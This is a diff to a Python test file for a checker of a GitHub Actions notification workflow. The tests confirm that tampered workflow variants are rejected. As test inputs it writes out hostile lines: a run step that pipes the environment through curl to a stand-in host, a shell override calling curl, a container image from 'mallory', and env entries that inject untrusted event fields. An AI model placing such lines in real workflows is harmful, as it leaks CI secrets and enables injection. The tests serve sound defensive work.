@@ -176,7 +176,8 @@ class SaferReadings(unittest.TestCase):
     def test_gates_read_semantically(self):
         # A narrower gate passes: admitting no workflow_run run at all (Workflow 3's fallback).
         self.assertEqual(check.check_gate("vars.DESK_NOTIFY_ON == 'true' && github.event_name != 'workflow_run'"), [])
-        self.assertEqual(check.check_gate("${{ false }}"), [])
+        # Any other narrower gate fails on its text: only the two exact forms pass.
+        self.assertEqual(codes(check.check_gate("${{ false }}")), ["notify-gate-text"])
         # The whole expression in ${{ }} reads the same.
         gate = check.read_yaml(NOTIFY)["jobs"]["notify"]["if"]
         self.assertEqual(check.check_gate("${{ " + gate + " }}"), [])
@@ -192,6 +193,75 @@ class SaferReadings(unittest.TestCase):
         self.assertEqual(codes(check.check_gate(gate.replace(
             "(github.event.action == 'completed' || github.event.workflow_run.name == 'desk-deploy')", "true"))),
             ["notify-gate-admits-more"])
+
+    def test_the_reviewers_probe_gates(self):
+        # Finding 1: a clause naming a value the evaluator does not try passed it; the text rule fails it.
+        end = "github.event.workflow_run.path == '.github/workflows/asks-merge.yml'))))"
+        for extra in ("github.event.workflow_run.head_repository.full_name == 'mallory/Service-Desk'",
+                      "github.event.workflow_run.conclusion == 'failure'",
+                      "github.event.workflow_run.head_branch == 'release'",
+                      "github.event.workflow_run.head_repository.owner.login == 'mallory'"):
+            with self.subTest(extra=extra):
+                self.notify_fails(one(NOTIFY, end, end[:-1] + " ||\n      " + extra + ")"), "notify-gate-text")
+
+    def test_the_gates_allowed_forms(self):
+        gate = check.read_yaml(NOTIFY)["jobs"]["notify"]["if"]
+        self.assertEqual(" ".join(gate.split()), check.GATE_FORMS[0])
+        # Whitespace and line breaks do not matter; the fallback form passes in the file too.
+        self.assertEqual(check.check_notify(one(NOTIFY, "      vars.DESK_NOTIFY_ON == 'true' &&\n",
+                                                "      vars.DESK_NOTIFY_ON   ==   'true'\n      &&\n")), [])
+        fallback = NOTIFY.replace(NOTIFY[NOTIFY.index("    if: >-\n"):NOTIFY.index("    runs-on:")],
+                                  "    if: vars.DESK_NOTIFY_ON == 'true' && github.event_name != 'workflow_run'\n")
+        self.assertEqual(check.check_notify(fallback), [])
+        # A reordered but equivalent gate is not Workflow 3's text.
+        self.notify_fails(one(NOTIFY, "github.event.workflow_run.event == 'push' ||\n      "
+                                      "github.event.workflow_run.event == 'pull_request' ||",
+                              "github.event.workflow_run.event == 'pull_request' ||\n      "
+                              "github.event.workflow_run.event == 'push' ||"), "notify-gate-text")
+
+    def test_the_upload_steps_if(self):
+        up = "        if: hashFiles('desk-notify-state/state.json') != ''\n"
+        self.notify_fails(one(NOTIFY, up, ""), "notify-upload-if")
+        self.notify_fails(one(NOTIFY, up, "        if: always()\n"), "notify-upload-if")
+        self.notify_fails(one(NOTIFY, up, "        if: hashFiles('desk-notify-state/state.json') != '' || always()\n"),
+                          "notify-upload-if")
+
+    def test_the_send_steps_run(self):
+        send = "        run: node src/notify/run.mjs --project Service-Desk\n"
+        for new in ("        run: node src/notify/run.mjs --project Service-Desk; env | curl -d @- https://x.invalid\n",
+                    "        run: node src/notify/run.mjs --project Service-Desk && echo done\n",
+                    "        run: |\n          node src/notify/run.mjs --project Service-Desk\n          echo done\n",
+                    "        run: node src/notify/run.mjs --project Personal-Org-Operating-Model\n"):
+            with self.subTest(new=new):
+                self.notify_fails(one(NOTIFY, send, new), "notify-send-run")
+        # The same command as a block passes; a second run: step fails.
+        self.assertEqual(check.check_notify(one(NOTIFY, send, "        run: |\n          node src/notify/run.mjs --project Service-Desk\n")), [])
+        self.notify_fails(one(NOTIFY, "      # The one step that sends", "      - run: echo hello\n      # The one step that sends"),
+                          "notify-send-run")
+
+    def test_no_container_and_no_shell_override(self):
+        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04\n    container: mallory/image:latest\n"),
+                          "notify-container")
+        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
+                              "    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: mallory/db\n"),
+                          "notify-container")
+        self.notify_fails(one(NOTIFY, "        run: node src/notify/run.mjs --project Service-Desk\n",
+                              "        shell: bash -c 'curl x' {0}\n        run: node src/notify/run.mjs --project Service-Desk\n"),
+                          "notify-shell")
+        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
+                              "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: python {0}\n"),
+                          "notify-shell")
+        self.notify_fails(one(NOTIFY, "\njobs:\n", "\ndefaults:\n  run:\n    shell: sh {0}\n\njobs:\n"), "notify-shell")
+
+    def test_no_event_values_in_workflow_or_job_env(self):
+        self.notify_fails(one(NOTIFY, "    runs-on: ubuntu-24.04\n",
+                              "    env:\n      BR: ${{ github.event.workflow_run.head_branch }}\n    runs-on: ubuntu-24.04\n"),
+                          "notify-event-env")
+        self.notify_fails(one(NOTIFY, "\njobs:\n", "\nenv:\n  T: ${{ inputs.test }}\n\njobs:\n"), "notify-event-env")
+        self.notify_fails(one(NOTIFY, "\njobs:\n", "\nenv:\n  T: ${{ toJSON(github.event) }}\n\njobs:\n"),
+                          "notify-event-env")
+        # A plain value there is no fault.
+        self.assertEqual(check.check_notify(one(NOTIFY, "\njobs:\n", "\nenv:\n  LANG: C.UTF-8\n\njobs:\n")), [])
 
     def test_the_ready_workflow(self):
         self.ready_fails(one(READY, "    timeout-minutes: 5\n", "    timeout-minutes: 5\n    environment: notify\n"),
